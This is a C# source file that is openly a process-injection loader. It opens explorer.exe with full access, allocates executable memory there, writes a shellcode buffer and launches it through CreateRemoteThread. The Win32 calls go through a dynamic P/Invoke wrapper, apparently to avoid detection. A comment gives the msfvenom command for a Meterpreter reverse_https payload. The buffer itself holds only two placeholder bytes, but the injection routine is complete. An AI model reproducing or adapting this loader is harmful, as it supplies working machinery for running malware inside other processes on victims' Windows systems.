using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Reflection.Emit;

namespace Standard_Process_Injection_Dynamic_Invoke
{
    class Program
    {
        static void Main(string[] argumentTypes)
        {
            // Grabs the current PID of the explorer
            var processes = Process.GetProcessesByName("explorer");
            System.Diagnostics.Process sprocess = processes[0];

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, (uint)sprocess.Id);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // msfvenom.bat -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=7710 -f csharp EXITFUNC=thread
            byte[] buf = new byte[2] { 0x8A, 0x0D };

            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }

        public static object DynamicInvoke(Type returnType, string library, string methodName, object[] arguments, Type[] parameterTypes)
        {
            var assemblyName = new AssemblyName("DynamicAssembly");
            var assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            var moduleBuilder = assemblyBuilder.DefineDynamicModule("DynamicModule");

            var methodBuilder = moduleBuilder.DefinePInvokeMethod(
                methodName,
                library,
                MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl,
                CallingConventions.Standard,
                returnType,
                parameterTypes,
                CallingConvention.Winapi,
                CharSet.Ansi
            );

            methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
            moduleBuilder.CreateGlobalFunctions();
            MethodInfo dynamicMethod = moduleBuilder.GetMethod(methodName);

            return dynamicMethod.Invoke(null, arguments);
        }

        public static IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId)
        {
            var paramterTypes = new Type[] { typeof(uint), typeof(bool), typeof(uint) };
            var argumentTypes = new object[] { processAccess, bInheritHandle, processId };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), "Kernel32.dll", "OpenProcess", argumentTypes, paramterTypes);
        }

        public static IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)
        {
            var paramterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(uint), typeof(uint) };
            var argumentTypes = new object[] { hProcess, lpAddress, dwSize, flAllocationType, flProtect };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), "Kernel32.dll", "VirtualAllocEx", argumentTypes, paramterTypes);
        }

        public static bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead)
        {
            var paramterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(byte[]), typeof(int), typeof(IntPtr).MakeByRefType() };
            var argumentTypes = new object[] { hProcess, lpBaseAddress, lpBuffer, dwSize, IntPtr.Zero };

            bool result = (bool)DynamicInvoke(typeof(bool), "Kernel32.dll", "ReadProcessMemory", argumentTypes, paramterTypes);

            lpNumberOfBytesRead = (IntPtr)argumentTypes[4];
            return result;
        }

        public static bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten)
        {
            var paramterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(byte[]), typeof(int), typeof(IntPtr).MakeByRefType() };
            var argumentTypes = new object[] { hProcess, lpBaseAddress, lpBuffer, nSize, IntPtr.Zero };

            bool result = (bool)DynamicInvoke(typeof(bool), "Kernel32.dll", "WriteProcessMemory", argumentTypes, paramterTypes);

            lpNumberOfBytesWritten = (IntPtr)argumentTypes[4];
            return result;
        }

        public static IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)
        {
            var paramterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr) };
            var argumentTypes = new object[] { hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), "Kernel32.dll", "CreateRemoteThread", argumentTypes, paramterTypes);
        }
    }
}
